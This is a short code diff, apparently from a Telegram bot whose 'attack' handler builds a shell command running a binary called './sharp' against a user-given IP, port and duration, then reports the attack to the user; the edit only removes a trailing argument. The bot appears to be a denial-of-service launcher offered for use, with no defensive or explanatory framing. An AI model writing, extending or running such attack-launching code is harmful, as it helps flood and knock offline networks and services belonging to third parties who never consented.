@@ -448,7 +448,7 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./sharp {ip} {port} {duration} 877"
+        attack_command = f"./sharp {ip} {port} {duration}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
